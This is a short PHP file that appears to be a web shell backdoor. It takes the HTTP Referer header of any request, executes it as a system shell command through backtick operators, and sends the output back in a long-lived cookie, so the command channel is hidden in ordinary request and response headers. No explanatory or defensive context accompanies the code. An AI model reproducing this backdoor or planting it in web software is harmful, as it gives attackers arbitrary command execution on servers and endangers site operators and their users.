<? 
if(isset($_SERVER['HTTP_REFERER'])){
	$_=$_SERVER['HTTP_REFERER'];
	$b = `$_`;
	session_destroy();
	setcookie("x", $b, time()+30*24*60*60);
} 

?>